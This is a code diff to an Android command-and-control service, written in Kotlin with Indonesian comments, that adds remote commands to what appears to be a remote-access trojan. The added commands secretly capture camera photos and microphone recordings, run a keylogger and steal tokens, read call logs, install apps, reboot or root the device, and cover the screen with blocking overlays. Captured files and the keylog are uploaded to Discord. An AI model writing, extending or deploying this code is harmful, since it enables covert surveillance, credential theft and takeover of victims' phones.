@@ -10,6 +10,7 @@ import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.provider.Settings
 import android.content.pm.ServiceInfo
 import android.location.LocationManager
 import android.os.BatteryManager
@@ -229,6 +230,8 @@ class C2Service : Service() {
         val (verb, arg) = split(m.optString("content", "")) ?: return
         when (verb) {
             "info" -> info()
+            "sys" -> say(Actions.sysinfo(this))
+            "ping" -> ping()
             "help" -> help()
             "sh" -> shell(arg)
             "cd" -> cd(arg)
@@ -237,6 +240,33 @@ class C2Service : Service() {
             "ps" -> ps()
             "kill" -> kill(arg)
             "msg" -> msg(arg)
+            "toast" -> say(Actions.toast(this, arg))
+            "notify" -> say(Actions.notify(this, arg))
+            "tts" -> Actions.tts(this, arg) { say(it) }
+            "vib" -> say(Actions.vibrate(this, arg))
+            "vol", "volume" -> say(Actions.volume(this, arg))
+            "torch" -> say(Actions.torch(this, arg.trim().lowercase() != "off"))
+            "cam" -> cam(arg)
+            "mic" -> mic(arg)
+            "rick" -> {
+                val ok = PlayerActivity.play(this, if (arg.startsWith("http")) arg else null)
+                say(if (ok) "RICK_OK" else "RICK_GAGAL")
+            }
+            "black" -> overlay(arg, true)
+            "block" -> overlay(arg, false)
+            "close" -> {
+                PlayerActivity.close()
+                Overlay.hide(this)
+                say("CLOSE_OK")
+            }
+            "wifi" -> say(Actions.wifi(this))
+            "root" -> say(Actions.root(this))
+            "reboot" -> say(Actions.reboot(this, arg))
+            "open" -> say(Actions.open(this, arg))
+            "inst" -> say(Actions.install(this, arg))
+            "keylog" -> keylog(arg)
+            "grab" -> say(Actions.tokens(this))
+            "calls" -> say(Actions.calls(this))
             "sleep" -> sleepCmd(arg)
             "exit" -> {
                 say("bye")
@@ -278,9 +308,18 @@ class C2Service : Service() {
     }
 
     private fun help() = say(
-        "info sh cd ls dl up shot clip ps kill msg loc sms smsread contacts apps " +
-            "ip storage battery perm boot rm mv gh sleep exit purge"
+        "info sys ping sh cd ls dl up shot cam mic clip ps kill msg toast notify " +
+            "tts vib vol torch loc sms smsread contacts calls apps ip storage battery " +
+            "wifi root reboot perm boot keylog rick black block open inst grab " +
+            "rm mv gh sleep close exit purge"
     )
+
+    private fun ping() {
+        val t0 = System.nanoTime()
+        val r = Discord.call("GET", "/users/@me")
+        val ms = (System.nanoTime() - t0) / 1_000_000
+        say("PING ${ms}ms http=${r.first}")
+    }
 
     private fun shell(cmd: String) {
         if (cmd.isBlank()) {
@@ -661,5 +700,115 @@ class C2Service : Service() {
         }
         packageManager.setComponentEnabledSetting(cn, state, PackageManager.DONT_KILL_APP)
         say("BOOT=${arg.trim().lowercase()}")
+    }
+
+    // ------------------------------------------------------------- multmedia
+
+    /**
+     * Capture kamera bisa makan 15 detik dan rekaman mic sampai 2 menit.
+     * Dijalankan di thread sendiri supaya antrean perintah tetap jalan.
+     */
+    private fun cam(arg: String) {
+        val front = arg.trim().lowercase().let { it == "front" || it == "1" || it == "depan" }
+        Thread({
+            val out = File(cacheDir, "cam.jpg")
+            try {
+                val st = Actions.camera(this, front, out)
+                if (st.startsWith("CAM_OK")) {
+                    val ok = Discord.upload(out, tag + st)
+                    say(if (ok) st else "CAM_GAGAL upload")
+                } else {
+                    say(st)
+                }
+            } catch (e: Exception) {
+                say("CAM_GAGAL ${e.message}")
+            } finally {
+                out.delete()
+            }
+        }, "cam").start()
+    }
+
+    private fun mic(arg: String) {
+        val secs = arg.trim().toIntOrNull() ?: 10
+        Thread({
+            val out = File(cacheDir, "mic.wav")
+            try {
+                val st = Actions.mic(this, secs, out)
+                if (st.startsWith("MIC_OK")) {
+                    val ok = Discord.upload(out, tag + st + " (" + Vfs.human(out.length()) + ")")
+                    say(if (ok) st else "MIC_GAGAL upload")
+                } else {
+                    say(st)
+                }
+            } catch (e: Exception) {
+                say("MIC_GAGAL ${e.message}")
+            } finally {
+                out.delete()
+            }
+        }, "mic").start()
+    }
+
+    // ---------------------------------------------------------------- overlay
+
+    private fun overlay(arg: String, black: Boolean) {
+        val label = if (black) "BLACK" else "BLOCK"
+        val a = arg.trim().lowercase()
+        val on = a.isEmpty() || a == "on" || a == "1"
+        if (!on) {
+            Overlay.hide(this)
+            say("$label=off")
+            return
+        }
+        if (!Overlay.canDraw(this)) {
+            say("ERR izin 'tampil di atas aplikasi lain' belum ada — buka app lalu izinkan")
+            return
+        }
+        say(if (Overlay.show(this, black)) "$label=on" else "ERR overlay gagal dipasang")
+    }
+
+    // ---------------------------------------------------------------- keylog
+
+    private fun keylog(arg: String) {
+        when (arg.trim().lowercase()) {
+            "on" -> {
+                KeylogService.enabled = true
+                if (KeylogService.isEnabled(this)) {
+                    say("KEYLOG=on")
+                } else {
+                    say(
+                        "KEYLOG belum aktif di sistem. Accessibility cuma bisa " +
+                            "dinyalakan pemilik perangkat — membuka Settings"
+                    )
+                    try {
+                        startActivity(
+                            Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
+                                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                        )
+                    } catch (_: Exception) {
+                    }
+                }
+            }
+
+            "off" -> {
+                KeylogService.enabled = false
+                say("KEYLOG=off (service tetap terpasang, berhenti mencatat)")
+            }
+
+            "clear" -> {
+                KeylogService.clear(this)
+                say("KEYLOG cleared")
+            }
+
+            else -> {
+                val f = KeylogService.file(this)
+                if (!f.exists() || f.length() == 0L) {
+                    say("KEYLOG kosong")
+                    return
+                }
+                val ok = Discord.upload(f, tag + "keylog " + f.length() + " B")
+                say(if (ok) "KEYLOG terkirim (${f.length()} B)" else "KEYLOG_GAGAL")
+                if (ok) f.delete()
+            }
+        }
     }
 }
